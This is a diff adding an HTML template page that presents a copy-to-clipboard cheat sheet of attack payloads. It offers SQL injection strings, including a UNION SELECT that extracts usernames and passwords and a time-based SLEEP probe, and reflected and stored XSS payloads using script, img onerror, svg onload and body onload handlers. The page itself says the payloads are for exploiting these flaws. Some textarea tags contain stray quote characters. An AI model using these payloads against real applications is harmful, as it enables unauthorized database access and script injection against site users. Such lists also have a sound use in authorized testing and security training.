@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vulnerabilities Payloads</title>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <script>
+        // Function to copy text to clipboard
+        function copyToClipboard(id) {
+            var copyText = document.getElementById(id);
+            copyText.select();
+            document.execCommand("copy");
+
+            // Alert the user that the text has been copied
+            alert("Copied: " + copyText.value);
+        }
+    </script>
+</head>
+<body class="bg-light">
+    <div class="container">
+        <header class="my-5 text-center">
+            <h1 class="display-4">Vulnerability Payloads</h1>
+            <p class="lead">Here are common payloads for SQL Injection, Reflected XSS, and Stored XSS. Click on the "Copy to Clipboard" button to copy any payload.</p>
+        </header>
+
+        <div class="card-deck mb-4">
+            <!-- SQL Injection Payloads -->
+            <div class="card">
+                <div class="card-body">
+                    <h5 class="card-title">SQL Injection Payloads</h5>
+                    <p class="card-text">These payloads are used to exploit SQL Injection vulnerabilities. Click on the copy button to copy any payload.</p>
+
+                    <textarea id="sql-payload-1" class="form-control" rows="3" readonly>' OR '1'='1</textarea>
+                    <button class="btn btn-primary mt-2" onclick="copyToClipboard('sql-payload-1')">Copy to Clipboard</button>
+
+                    <textarea id="sql-payload-2" class="form-control mt-3" rows="3" readonly>' UNION SELECT null, username, password FROM users --</textarea>
+                    <button class="btn btn-primary mt-2" onclick="copyToClipboard('sql-payload-2')">Copy to Clipboard</button>
+
+                    <textarea id="sql-payload-3" class="form-control mt-3" rows="3" readonly>' --</textarea>
+                    <button class="btn btn-primary mt-2" onclick="copyToClipboard('sql-payload-3')">Copy to Clipboard</button>
+
+                    <textarea id="sql-payload-4" class="form-control mt-3" rows="3" readonly>' OR SLEEP(5) --</textarea>
+                    <button class="btn btn-primary mt-2" onclick="copyToClipboard('sql-payload-4')">Copy to Clipboard</button>
+                </div>
+            </div>
+
+            <!-- Reflected XSS Payloads -->
+            <div class="card">
+                <div class="card-body">
+                    <h5 class="card-title">Reflected XSS Payloads</h5>
+                    <p class="card-text">These payloads are used to exploit reflected Cross-Site Scripting (XSS) vulnerabilities. Click on the copy button to copy any payload.</p>
+
+                    <textarea id="xss-reflected-payload-1" class="form-control" rows="3" readonly"><script>alert('XSS');</script></textarea>
+                    <button class="btn btn-warning mt-2" onclick="copyToClipboard('xss-reflected-payload-1')">Copy to Clipboard</button>
+
+                    <textarea id="xss-reflected-payload-2" class="form-control mt-3" rows="3" readonly"><img src="x" onerror="alert('XSS')"></textarea>
+                    <button class="btn btn-warning mt-2" onclick="copyToClipboard('xss-reflected-payload-2')">Copy to Clipboard</button>
+
+                    <textarea id="xss-reflected-payload-3" class="form-control mt-3" rows="3" readonly"><svg onload="alert('XSS')"></svg></textarea>
+                    <button class="btn btn-warning mt-2" onclick="copyToClipboard('xss-reflected-payload-3')">Copy to Clipboard</button>
+
+                    <textarea id="xss-reflected-payload-4" class="form-control mt-3" rows="3" readonly"><body onload="alert('XSS')"></body></textarea>
+                    <button class="btn btn-warning mt-2" onclick="copyToClipboard('xss-reflected-payload-4')">Copy to Clipboard</button>
+                </div>
+            </div>
+
+            <!-- Stored XSS Payloads -->
+            <div class="card">
+                <div class="card-body">
+                    <h5 class="card-title">Stored XSS Payloads</h5>
+                    <p class="card-text">These payloads are used to exploit stored Cross-Site Scripting (XSS) vulnerabilities. Click on the copy button to copy any payload.</p>
+
+                    <textarea id="xss-stored-payload-1" class="form-control" rows="3" readonly"><script>alert('Stored XSS');</script></textarea>
+                    <button class="btn btn-danger mt-2" onclick="copyToClipboard('xss-stored-payload-1')">Copy to Clipboard</button>
+
+                    <textarea id="xss-stored-payload-2" class="form-control mt-3" rows="3" readonly"><img src="x" onerror="alert('Stored XSS')"></textarea>
+                    <button class="btn btn-danger mt-2" onclick="copyToClipboard('xss-stored-payload-2')">Copy to Clipboard</button>
+
+                    <textarea id="xss-stored-payload-3" class="form-control mt-3" rows="3" readonly"><svg onload="alert('Stored XSS')"></svg></textarea>
+                    <button class="btn btn-danger mt-2" onclick="copyToClipboard('xss-stored-payload-3')">Copy to Clipboard</button>
+
+                    <textarea id="xss-stored-payload-4" class="form-control mt-3" rows="3" readonly"><body onload="alert('Stored XSS')"></body></textarea>
+                    <button class="btn btn-danger mt-2" onclick="copyToClipboard('xss-stored-payload-4')">Copy to Clipboard</button>
+                </div>
+            </div>
+        </div>
+
+        <footer class="text-center my-4">
+            <a href="/" class="btn btn-secondary">Back to Home</a>
+        </footer>
+    </div>
+</body>
+</html>
